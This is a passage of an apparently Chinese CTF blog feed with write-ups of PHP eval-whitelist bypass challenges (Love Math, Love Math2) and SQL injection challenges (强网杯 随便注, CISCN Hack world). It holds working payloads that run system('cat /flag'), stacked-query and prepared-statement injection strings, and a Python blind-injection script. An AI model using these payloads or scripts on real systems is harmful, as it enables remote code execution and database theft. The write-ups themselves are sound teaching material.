class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="审计">审计</h4><p>可以看到代码对于我们的传参进行了如下限制：</p><ol><li><p>长度限制&lt;80</p></li><li><p>黑名单特殊字符限制</p></li><li><p>正则匹配字符通过白名单验证，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abs(1)能过</span><br><span class="line">1abs()能过</span><br><span class="line">absa()不能过</span><br><span class="line">abs(a)不能过</span><br><span class="line">abs()a不能过</span><br></pre></td></tr></table></figure></li></ol><p>其中正则匹配字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs); </span><br></pre></td></tr></table></figure><p>是将<code>$content</code>变量中以字母开头的字符串组成数组储存在<code>$used_funcs</code>变量中。</p><p>查看<code>$whitelist</code>我们可以看到两个进制转换函数：</p><blockquote><ul><li>base_convert()：在任意进制之间转换数字（2 - 32 进制)。</li><li>dechex()：把十进制数转换为十六进制数。</li></ul></blockquote><p>我们知道<code>32进制</code>包括<code>0-9a-z</code>等字符。所以我们可以通过<code>base_convert()</code>函数利用进制转换构造特定的字符串。</p><h4 id="构造payload">构造payload</h4><h5 id="方法一">方法一</h5><p>由于长度的限制，肯定是要构造<code>&#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)</code>来执行shell。</p><blockquote><p><code>hex2bin() 函数</code>：把十六进制值的字符串转换为 ASCII 字符。</p></blockquote><p>首先把<code>$_GET</code>转换为10进制表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(binascii.b2a_hex(<span class="string">b&#x27;_GET&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="number">1598506324</span></span><br></pre></td></tr></table></figure><p>再利用<code>base_convert</code>函数构造<code>hex2bin</code>函数：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703115033.png" style="zoom:67%;" /><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(base_convert(37907361743, 10, 36));</span><br><span class="line">string(7) &quot;hex2bin&quot;</span><br></pre></td></tr></table></figure><p>最后，我们就利用<code>dechex</code>函数把10进制表示的<code>$_GET</code>转换为16进制表示，然后传入<code>hex2bin()</code>函数。</p><p>所以最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>另外一种形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure></blockquote><h5 id="方法二">方法二</h5><p>通过<code>getallheaders()</code>函数，读取写入HTTP request header字段的值。</p><p>payload的构造方式和上面一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>解释如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">&#x2F;&#x2F;操作xx和yy，中间用逗号隔开，echo都能输出</span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure><h2 id="NESTCTF2019-Love-Math2">NESTCTF2019 Love Math2</h2><h3 id="考点-v9">考点</h3><ul><li>代码审计</li><li>Fuzz</li></ul><h3 id="解题-v9">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上面的那道题基本上是一样的，但是限制更为严格，参数长度必须小于60，所以那道题的两个方法都不能用，这里再介绍一种Fuzz的脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要目的就是想fuzz出<code>_GET</code>字符串。可以把这个字符串拆分成两段。先查找<code>_G</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php fuzz.php | grep _G</span><br><span class="line">is_finite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_infinite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_nan^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_getrandmax^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_rand^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_srand^23&#x3D;&#x3D;&gt;_G</span><br></pre></td></tr></table></figure><p>再来查找<code>ET</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php fuzz.php | grep ET</span><br><span class="line">rad2deg^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">rand^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">tan^15&#x3D;&#x3D;&gt;ET</span><br><span class="line">tanh^15&#x3D;&#x3D;&gt;ET</span><br></pre></td></tr></table></figure><p>选择函数名最短的即可。最终的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GXYCTF2019-Ping-Ping-Ping&quot;&gt;GXYCTF2019 Ping Ping Ping&lt;/h2&gt;
&lt;h3 id=&quot;TODO&quot;&gt;TODO&lt;/h3&gt;
&lt;h2 id=&quot;ACTF2020-新生赛-Exec&quot;&gt;ACTF2020 新生赛 Exec&lt;/h2&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——SQL注入</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-18T09:58:19.000Z</published>
    <updated>2020-10-15T08:16:54.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="强网杯-2019-随便注">强网杯 2019 随便注</h2><h3 id="考点">考点</h3><ul><li>堆叠注入</li><li>预编译语句</li></ul><h3 id="解题">解题</h3><h4 id="方法一">方法一</h4><p>判断注入点</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113111.png" style="zoom:67%;" /><p>之后进行union联合注入的时候发现了正则过滤 几乎过滤了我们所有能用到的语句</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113206.png" style="zoom:67%;" /><p>再尝试堆叠注入， <code>show tables </code>查询当前数据库中的表发现了两个表</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113424.png" style="zoom:67%;" /><p>看下两个表的结构字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看words表的字段</span><br><span class="line">&#39;;show columns from words;# </span><br><span class="line">&#x2F;&#x2F;查看1919810931114514表的字段</span><br><span class="line">&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113614.png" style="zoom:67%;" /><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113642.png" style="zoom:67%;" /><p>骚姿势开始了，我们默认查询的表是<code>word</code>表，那么就可以通过<code>rename</code>语句把<code>words</code>表的表名改成<code>words1</code>，把<code>1919810931114514</code>的表名改成<code>words</code>，然后再用<code>alter</code>语句把<code>flag</code>字段名改成<code>id</code>即可。。。😂</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure><p>用 1′ or ‘1’=’1 访问一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618120643.png" alt=""></p><h4 id="方法二">方法二</h4><p>使用MySQL预处理语句绕过过滤。</p><p>我们进行构造这个语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);</span><br><span class="line">prepare sql from @a</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# </span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123618.png" alt=""></p><p>大小写绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123707.png" alt=""></p><h2 id="CISCN2019-Hack-world">CISCN2019 Hack world</h2><h3 id="考点-v2">考点</h3><ul><li>Bool盲注</li><li>Python脚本编写</li><li>异或注入</li></ul><h3 id="解题-v2">解题</h3><p>每次碰到这种SQL注入的题目都没太多思路。</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620111314.png" style="zoom:50%;" /><p>根据1和2返回结果的不同，可能是bool盲注，<code>()</code>没有过滤，可以使用大部分函数。</p><blockquote><p>空格绕过：<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab</p></blockquote><p>任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>payload示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure><p>如果等号成立的话，那么就返回<code>Hello, glzjin wants a girlfriend.</code>，如果不成立那么就返回<code>Do you want to be my girlfriend?</code>，用二分法编写盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;</span>.format(index=i, char=mid)</span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h3 id="拓展：CTF几种盲注的手法">拓展：CTF几种盲注的手法</h3><p><a href="https://www.anquanke.com/post/id/160584#h2-0">https://www.anquanke.com/post/id/160584#h2-0</a></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk">CISCN2019 华北赛区 Day1 Web5 CyberPunk</h2><h3 id="考点-v3">考点</h3><ul><li>文件包含</li><li>二次注入</li><li>报错注入</li></ul><h3 id="解题-v3">解题</h3><p>查看源码提示<code>index.php</code>有file参数，可以使用伪协议文件包含。</p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 